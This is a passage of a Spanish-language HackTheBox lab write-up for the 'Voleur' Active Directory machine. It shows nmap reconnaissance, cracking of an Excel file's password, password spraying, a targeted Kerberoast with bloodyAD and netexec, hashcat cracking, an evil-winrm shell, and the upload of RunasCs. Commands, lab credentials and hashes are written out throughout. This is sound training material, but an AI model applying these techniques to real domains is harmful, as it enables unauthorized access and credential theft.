---
title: HackTheBox Vouler Writeup
published: true
---


> **Voleur** es un cuadro de Active Directory que comienza con "assuming breach credentials". Busco un cuaderno de Excel con credenciales y obtengo un shell. Busco un usuario eliminado y cambio a una cuenta de servicio para recuperarlo. Ese usuario puede acceder a un recurso compartido SMB con una copia de seguridad del directorio personal de un usuario, donde encuentro credenciales cifradas con DPAPI. Las recupero, obteniendo acceso a una clave SSH que proporciona acceso a una instancia de WSL. Allí encuentro >copias de seguridad del subárbol del registro donde puedo volcar el hash del administrador.


> **Voleur** es una máquina de **Hack The Box** basada en **Active Directory** que parte del escenario  
> _ “”_.

-


![Captura de pantalla de la web](assets/images/Vouler/imagen_1.png)


# 🔍 Reconocimiento

---


**nmap** encuentra un montón de puertos TCP abiertos :

-


```nmap
jorge@hacky$ nmap -p- -vvv --min-rate 10000 10.10.11.76
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 20:48 UTC
...[snip]...
Nmap scan report for 10.10.11.76
Host is up, received echo-reply ttl 127 (0.090s latency).
Scanned at 2025-07-08 20:48:20 UTC for 20s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2222/tcp  open  EtherNetIP-1     syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49900/tcp open  unknown          syn-ack ttl 127
49901/tcp open  unknown          syn-ack ttl 127
49912/tcp open  unknown          syn-ack ttl 127
52257/tcp open  unknown          syn-ack ttl 127
52273/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.03 seconds
           Raw packets sent: 196576 (8.649MB) | Rcvd: 30 (1.304KB)
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389 -sCV 10.10.11.76
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 20:49 UTC
Nmap scan report for 10.10.11.76
Host is up (0.090s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-09 05:00:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2025-07-09T05:00:38
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 8h10m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds

```

---



El cuadro muestra muchos de los puertos asociados a un controlador de dominio de Windows . El dominio es voleur.htby el nombre de host es DC. Usaré [nombre de host netexec] para actualizar mi `hosts` archivo:

-

```nmap
jorge@hacky$ netexec smb 10.10.11.76 --generate-hosts-file hosts
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
jorge@hacky$ cat hosts 
10.10.11.76     DC.voleur.htb voleur.htb DC
jorge@hacky$ cat hosts /etc/hosts | sponge /etc/hosts
```

*

5985 está disponible para `WinRM` si encuentro credenciales, y 2222 parece `OpenSSH` en Ubuntu, probablemente 20.04 focal . No hay diferencia en los TTL, pero eso podría significar que Windows está utilizando un proxy para la conexión o WSL.


>Tomaré nota del desfase del reloj de 8 horas, que tendré que corregir sudo ntpdate dc.voleur.htbpara poder usar Kerberos.
>

---

-


# 🔐 Credenciales iniciales

HackTheBox proporciona el siguiente escenario asociado con Voleur:

>
Como es común en las pruebas de penetración de Windows de la vida real, iniciará el cuadro Voleur con las credenciales de la siguiente cuenta: ryan.naylor / HollowOct31Nyt


Las credenciales fallan con `NTLM `:

--

```nmap
jorge@hacky$ netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
```

---

`STATUS_NOT_SUPPORTED` Significa que la autenticación `NTLM` está deshabilitada. netexec También se muestra como "NTLM:False". Con Kerberos (después de asegurarme de que mi reloj esté alineado con [false `sudo ntpdate voleur.htb`]), funciona:

-

```nmap
jorge@hacky$ netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 

```


También funcionan para `LDAP`:

```nmap
jorge@hacky$ netexec ldap 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.10.11.76     389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```
-

Teniendo esto en cuenta, querré priorizar cosas como:

- Acciones de SMB
- Bloodhound (que incluye la mayoría de los datos de LDAP)
- ADCS


Dado el usuario de Kerberos, también generaré un `krb5.conf` archivo usando `netexec`:


```nmap
jorge@hacky$ netexec smb 10.10.11.76 --generate-krb5-file krb5.conf
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.10.11.76     445    DC               [+] krb5 conf saved to: krb5.conf
SMB         10.10.11.76     445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
jorge@hacky$ sudo cp krb5.conf /etc/krb5.conf
```
---

-


# SMB - TCP 445



## 🧑‍💻 Enumeración de acciones

Los recursos compartidos de SMB se parecen a los recursos compartidos del controlador de dominio de AD predeterminados, así como `Finance`, `HR`, y `IT`:

```nmap
jorge@hacky$ netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k --shares
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.10.11.76     445    DC               [*] Enumerated shares
SMB         10.10.11.76     445    DC               Share           Permissions     Remark
SMB         10.10.11.76     445    DC               -----           -----------     ------
SMB         10.10.11.76     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.76     445    DC               C$                              Default share
SMB         10.10.11.76     445    DC               Finance                         
SMB         10.10.11.76     445    DC               HR                              
SMB         10.10.11.76     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.76     445    DC               IT              READ            
SMB         10.10.11.76     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.76     445    DC               SYSVOL          READ            Logon server share 
```
ryan.naylor tiene acceso de lectura al recurso compartido de TI.


## Compartir TI

Para conectarme a un recurso compartido SMB mediante Kerberos, puedo usar `smbclient.py` el script de Impacket:

```nmap
jorge@hacky$ smbclient.py voleur.htb/ryan.naylor:HollowOct31Nyt@dc.voleur.htb -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
# 
```

O puedo usar `smbclient` (con el `krb5.conf` en su lugar):

```nmap
jorge@hacky$ smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
Try "help" to get a list of possible commands.
smb: \> 
```

Hay un documento en el `IT` recurso compartido:

```nmap
smb: \> ls
  .                                   D        0  Wed Jan 29 09:10:01 2025
  ..                                DHS        0  Thu Jul 24 20:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 09:40:17 2025

                5311743 blocks of size 4096. 980038 blocks available
smb: \> ls 'First-Line Support\'
  .                                   D        0  Wed Jan 29 09:40:17 2025
  ..                                  D        0  Wed Jan 29 09:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 14:14:25 2025

                5311743 blocks of size 4096. 980038 blocks available
```

Voy a coger una copia:

```nmap
smb: \First-Line Support\> get Access_Review.xlsx 
getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Review.xlsx (179.3 KiloBytes/sec) (average 179.3 KiloBytes/sec)

```

El archivo está encriptado:

```nmap
jorge@hacky$ file Access_Review.xlsx
Access_Review.xlsx: CDFV2 Encrypted

```

Para intentar abrirlo se requiere una contraseña:

---

![Captura de pantalla de la web](assets/images/Vouler/imagen_2.webp)

---

-

## 👉 Descifrar contraseña

Lo usaré `office2john.py` para hacer un hash del libro de Excel:

```nmap
jorge@hacky$ python /opt/john/run/office2john.py Access_Review.xlsx | tee Access_Review.xlsx.hash
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

`hashcat` tomará esto, y siempre que le dé la --userbandera (ya que el nombre del archivo y luego un ":" están al comienzo de la línea), detectará el modo y descifrará la contraseña en aproximadamente 15 segundos:

```nmap
$ hashcat Access_Review.xlsx.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:
...[snip]...                                                                   9600 | MS Office 2013 | Document
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1

```

## 📄 Revisión de acceso.xlsx

Con la contraseña, el archivo se abre y revela una lista de usuarios, algunas contraseñas y sus accesos:

---

![Captura de pantalla de la web](assets/images/Vouler/imagen_3.png)

---

Haré una lista de usuarios y contraseñas y los distribuiré a todos para ver qué funciona:

```nmap
jorge@hacky$ netexec smb 10.10.11.76 -u users -p passwords -k --continue-on-success | grep -v KDC_ERR_PREAUTH_FAILED
SMB                      10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB                      10.10.11.76     445    DC               [-] voleur.htb\Todd.Wolfe:NightT1meP1dg3on14 KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB                      10.10.11.76     445    DC               [-] voleur.htb\Todd.Wolfe:M1XyC9pW7qT5Vn KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB                      10.10.11.76     445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
SMB                      10.10.11.76     445    DC               [-] voleur.htb\Todd.Wolfe:N5pXyW1VqM7CZ8 KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB                      10.10.11.76     445    DC               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
```

La mayoría devuelve `KDC_ERR_PREAUTH_FAILED`, lo que indica una contraseña incorrecta (y ya lo he `grep` eliminado). **Todd.Wolfe** muestra `KDC_ERR_C_PRINCIPAL_UNKNOWN`, que coincide con lo que figuraba en el documento de Excel que indicaba que la cuenta se había eliminado. También muestra contraseñas válidas para svc_ldap y svc_iis.

Hay una ruta de acceso directo desde aquí que usa svc_ldap para ir directamente a la autenticación como **todd.wolfe** usando un nuevo módulo `NetExec` que mostraré en Beyond Root .

## Sabueso

Obtendré datos de Bloodhound usando RustHound-CE :


```nmap
jorge@hacky$ rusthound-ce -d voleur.htb -u ryan.naylor -p HollowOct31Nyt -c All --zip                  
---------------------------------------------------
Initializing RustHound-CE at 05:57:43 on 07/09/25
Powered by @g0h4n_0
---------------------------------------------------
[2025-07-09T05:57:43Z INFO  rusthound_ce] Verbosity level: Info
[2025-07-09T05:57:43Z INFO  rusthound_ce] Collection method: All
[2025-07-09T05:57:43Z INFO  rusthound_ce::ldap] Connected to VOLEUR.HTB Active Directory!
[2025-07-09T05:57:43Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-07-09T05:57:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-09T05:57:43Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=voleur,DC=htb
[2025-07-09T05:57:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-09T05:57:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=voleur,DC=htb
[2025-07-09T05:57:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-09T05:57:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=voleur,DC=htb
[2025-07-09T05:57:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-09T05:57:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=voleur,DC=htb
[2025-07-09T05:57:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-09T05:57:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=voleur,DC=htb
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::parser] Starting the LDAP objects parsing...
[2025-07-09T05:57:47Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::parser] Parsing LDAP objects finished!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 5 ous parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2025-07-09T05:57:47Z INFO  rusthound_ce::json::maker::common] .//20250709055747_voleur-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 05:57:47 on 07/09/25! Happy Graphing! 
```

Iniciaré el contenedor Docker de Bloodhound CE y cargaré los datos. Al marcar ryan.naylor y svc_iis como propios, no veo nada interesante. Sin embargo, svc_ldap tiene un par de rutas de control de salida:

---

![Captura de pantalla de la web](assets/images/Vouler/imagen_4.webp)
---


Si analizamos ambas rutas, no hay nada demasiado interesante sobre lacey.miller o los técnicos de soporte de segunda línea. svc_winrm es miembro de Usuarios de administración remota:

---

![Captura de pantalla de la web](assets/images/Vouler/imagen_5.webp)
---

Esto significa que debería poder conseguir un shell. Volveré a lacey.miller si me quedo atascado.


#  📌 Shell como svc_winrm

-

### Kerberoast dirigido 

Con `WriteSPN` privilegios sobre la cuenta *svc_winrm*, realizaré un ataque dirigido a Kerberoast. Ya lo he demostrado en Vintage , Administrator y Blazorized , usando intendedKerberoast.py , BloodyAD + NetExec y PowerView .

Voy a empezar con `bloodyAD` y `netexec` aquí. Primero, agregaré un SPN a svc_winrm:


```nmap
jorge@hacky$ bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/whatever'
[+] svc_winrm's servicePrincipalName has been updated

```

Ahora voy a coleccionar un `TGS`:

```nmap

jorge@hacky$ netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hashLDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 1
LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 09:10:12.398769, lastLogon: 2025-01-29 15:07:32.711487
LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$b2054c9d13850ff6ed45fdbe6746b7f0$965636eba88dfd0a3131dbd3d83770a1cd40398b02725c0fb62f34ab951e91933e2ee95487fa7bb950c906af2989e899f9db592930caaa35de089b51331e26c8e862623537c19b2eb932d1d9fdd46239055c1948136a3675d6516bff98434df6b7149affec20eadc6fdaf51988c7fb4ee9feecc3e160b870908145ac1f9b20123b5f657abdd03a579a2d8bf0309a2541944c7eb1dc6fa5f0ba403b44b21fe2172a8f314d2983f353ae04ce585ceabb817666246f8283d90495a676770ec033a2b73d7f2db5fa0b860abe2dd4ade3091b5d484816af77cce1adc5ee53e659af2a69543c6263433fdd343d7d5a03a83ecbdb2dbcd39c3c4a7c2b9424e12b9f0dda52737e2682a1e48a5535580126b4672121406c56c2b1e1c406db35bbe1a7b026f90b581a41808a6bb1f6ba935b5b2c3722ea2d68b136a24d1bf1c9f0ed5028ec436668260d61a681f1f13873554acf5a9b7dea272b401b24e5abbdcfc7568f2f86a277861b5feb0429b69190c4d0d7cc14b00f4765163b894c208be9b00bac60feacd696c27e96c88a82ec37a03a923cd43d8166fbc99d301485be556ff3f48a168d7a30e185c29c513c069329cce2f04be32051e42197bd8b415ef1dfcd55016423e9b897b0d7558ac3f026eea525dc09beeff00ee960d6efc9c87673c4ecac44694f103662b5da29a3d95e966919e14ccad6013c86e6d765ae7fe0866e5183dda17c87ed4f2b2a49ff43bbbee2ee60628d9fea2fbbc5d03483834675b0bbe6b640d687949890f4fa369a081d91ea475e72e9d67fe3aa7e1ccfdcd862bcb08664812f83d20dd9d3c9ab2e93eeecd886dd0c209c95bc023d1c77c6607d1bfd50a989928058984f2a0d5a07eb85761feec4d84222ec7406d39086946058d788c63d17f2b195b1a4c25712f1be4e59e40c8195f29c3b5ed799e503639ab30c7b0d523b9c6158c7e240e7ce3fcd11fe4ad55f5ae507e77b9f51ab3aa275595fe8a21552b58ab193775f96e552e19dd8a7eee8ce0c9fdf97f55b6bc2ecc0a90b0cff2d42ba102699e8b531418ff59719479e8e2676d2674356847110d095666ae31e7ad6efaab8930c3d420c5c9abd457b79ebca98689d7a938c5e8ff7e3c794e7068ae7d1cc2598205ca791ce037c7f9a231cb87085dc785ebe894a8354710511e1112c8336c2b35e28a38ba3af23ae28ec1fa149ddeeddcd55730e80571c56f74b4243fceeae6cdfb3048a73a272f4c684d78176cc8e8ee70154ddd74b5158ffcc9e5f4d4dafd6abc55855edceff763870ae07be87d3e5b6296a71c2670feed12decfb28ce0cd9dd8373882670faac2db338e1f40e887b8bd24440ae70262fcf95ec00f591390150e5c9fdee3d63f13a74bb0e22eb4270922c941bce589112926683559002c33ece5a70e4f304cba8b737417fe30bdb8ba1b39647bde8a64d3794f563a3c7a34d6b14e2784e02bb65663058548a

```

-

## Crack TGS
-

Le pasaré ese archivo `hash` a rockyou.txt:

```nmap
$ hashcat svc_winrm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol 
...[snip]...
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$b2054c9d13850ff6ed45fdbe6746b7f0$965636eba88dfd0a3131dbd3d83770a1cd40398b02725c0fb62f34ab951e91933e2ee95487fa7bb950c906af2989e899f9db592930caaa35de089b51331e26c8e862623537c19b2eb932d1d9fdd46239055c1948136a3675d6516bff98434df6b7149affec20eadc6fdaf51988c7fb4ee9feecc3e160b870908145ac1f9b20123b5f657abdd03a579a2d8bf0309a2541944c7eb1dc6fa5f0ba403b44b21fe2172a8f314d2983f353ae04ce585ceabb817666246f8283d90495a676770ec033a2b73d7f2db5fa0b860abe2dd4ade3091b5d484816af77cce1adc5ee53e659af2a69543c6263433fdd343d7d5a03a83ecbdb2dbcd39c3c4a7c2b9424e12b9f0dda52737e2682a1e48a5535580126b4672121406c56c2b1e1c406db35bbe1a7b026f90b581a41808a6bb1f6ba935b5b2c3722ea2d68b136a24d1bf1c9f0ed5028ec436668260d61a681f1f13873554acf5a9b7dea272b401b24e5abbdcfc7568f2f86a277861b5feb0429b69190c4d0d7cc14b00f4765163b894c208be9b00bac60feacd696c27e96c88a82ec37a03a923cd43d8166fbc99d301485be556ff3f48a168d7a30e185c29c513c069329cce2f04be32051e42197bd8b415ef1dfcd55016423e9b897b0d7558ac3f026eea525dc09beeff00ee960d6efc9c87673c4ecac44694f103662b5da29a3d95e966919e14ccad6013c86e6d765ae7fe0866e5183dda17c87ed4f2b2a49ff43bbbee2ee60628d9fea2fbbc5d03483834675b0bbe6b640d687949890f4fa369a081d91ea475e72e9d67fe3aa7e1ccfdcd862bcb08664812f83d20dd9d3c9ab2e93eeecd886dd0c209c95bc023d1c77c6607d1bfd50a989928058984f2a0d5a07eb85761feec4d84222ec7406d39086946058d788c63d17f2b195b1a4c25712f1be4e59e40c8195f29c3b5ed799e503639ab30c7b0d523b9c6158c7e240e7ce3fcd11fe4ad55f5ae507e77b9f51ab3aa275595fe8a21552b58ab193775f96e552e19dd8a7eee8ce0c9fdf97f55b6bc2ecc0a90b0cff2d42ba102699e8b531418ff59719479e8e2676d2674356847110d095666ae31e7ad6efaab8930c3d420c5c9abd457b79ebca98689d7a938c5e8ff7e3c794e7068ae7d1cc2598205ca791ce037c7f9a231cb87085dc785ebe894a8354710511e1112c8336c2b35e28a38ba3af23ae28ec1fa149ddeeddcd55730e80571c56f74b4243fceeae6cdfb3048a73a272f4c684d78176cc8e8ee70154ddd74b5158ffcc9e5f4d4dafd6abc55855edceff763870ae07be87d3e5b6296a71c2670feed12decfb28ce0cd9dd8373882670faac2db338e1f40e887b8bd24440ae70262fcf95ec00f591390150e5c9fdee3d63f13a74bb0e22eb4270922c941bce589112926683559002c33ece5a70e4f304cba8b737417fe30bdb8ba1b39647bde8a64d3794f563a3c7a34d6b14e2784e02bb65663058548a:AFireInsidedeOzarctica980219afi
...[snip]...

```

Se convierte en “AFireInsidedeOzarctica980219afi” casi instantáneamente.

-

#   🧩 Caparazón

-

## Validar credenciales

Estas credenciales funcionan para svc_winrm:

```nmap
oxdf@hacky$ netexec smb dc.voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 
```

netexecNo se puede comprobar winrma través de Kerberos, pero tengo buenas razones para creer, a partir de los datos de Bloodhound, que la cuenta debería poder acceder a él.

-

# Evil-WinRM

Ahora usaré `kinit` para generar un ticket para el usuario svc_winrm:

```nmap
jorge@hacky$ kinit svc_winrm
Password for svc_winrm@VOLEUR.HTB:  
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
07/09/2025 23:10:57  07/10/2025 09:10:57  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 07/10/2025 23:10:45
07/09/2025 23:10:59  07/10/2025 09:10:57  HTTP/dc.voleur.htb@VOLEUR.HTB
        renew until 07/10/2025 23:10:45
```

Esto es muy similar a usar algo como `getTGT.py`, pero lo coloca en la ubicación predeterminada, por lo que no tengo que configurar ninguna variable de entorno para usarlo.

Con todo esto configurado, me conectaré a través de `WinRM`:

```namp
jorge@hacky$ evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 

```

Y toma la bandera del usuario:

```
*Evil-WinRM* PS C:\Users\svc_winrm\desktop> type user.txt
fc0072d8************************
``` 
-

# 🧪 Shell como todd.wolfe



## Enumeración

-

No hay nada más de interés en el directorio de inicio de svc_winrm:

```nmap
*Evil-WinRM* PS C:\Users\svc_winrm> tree /f .
Folder PATH listing
Volume serial number is 00000229 A5C3:6454
C:\USERS\SVC_WINRM
+---3D Objects
+---Contacts
+---Desktop
¦       Microsoft Edge.lnk
¦       user.txt
¦
+---Documents
+---Downloads
+---Favorites
¦   ¦   Bing.url
¦   ¦
¦   +---Links
+---Links
¦       Desktop.lnk
¦       Downloads.lnk
¦
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos

```

Hay varios otros usuarios con directorios personales:

```nmap
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2025   3:30 PM                Administrator
d-----         1/29/2025   7:11 AM                jeremy.combs
d-r---         1/28/2025  12:35 PM                Public
d-----         1/30/2025   3:39 AM                svc_backup
d-----         1/29/2025   4:47 AM                svc_ldap
d-----         1/29/2025   7:07 AM                svc_winrm
d-----         1/29/2025   4:53 AM                todd.wolfe
```

svc_winrm no puede acceder a ninguno de ellos.

-


## ✨ Sistema de archivos
-


Hay directorios en la raíz de C que coinciden con los recursos compartidos disponibles a través de SMB:

```namp
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   1:10 AM                Finance
d-----         1/29/2025   1:10 AM                HR
d-----         5/29/2025   3:07 PM                inetpub
d-----         1/29/2025   1:10 AM                IT
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         1/30/2025   6:20 AM                Program Files
d-----         1/30/2025   5:53 AM                Program Files (x86)
d-r---         1/30/2025   3:38 AM                Users
d-----          6/5/2025  12:53 PM                Windows
```
svc_winrm solo puede acceder a `IT`:


```namp
*Evil-WinRM* PS C:\IT> ls

    Directory: C:\IT

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   1:40 AM                First-Line Support
d-----         1/29/2025   7:13 AM                Second-Line Support
d-----         1/30/2025   8:11 AM                Third-Line Support
```

Y no puedo acceder a ninguno de estos directorios.

-

## Papelera de reciclaje de AD


Al igual que en `Cascade` y `TombWatcher` , la papelera de reciclaje de AD está habilitada aquí:


```nmap
*Evil-WinRM* PS C:\> Get-ADOptionalFeature 'Recycle Bin Feature'

DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=voleur,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=voleur,DC=htb, CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=voleur,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : ba06e572-1681-46f7-84d2-e08b001f5c51
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```

Dado que `svc_ldap` está en el grupo de usuarios de restauración, parece un lugar razonable para comenzar.

---

# 💡 Recuperar cuenta


## Shell como svc_ldap 

Para interactuar con la papelera de reciclaje, necesito cambiar a svc_ldap. Este usuario no puede usar WinRM, pero yo puedo usar RunasCs :

```namp
*Evil-WinRM* PS C:\programdata> upload RunasCs.exe RunasCs.exe 
                                        
Info: Uploading RunasCs.exe to C:\programdata\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
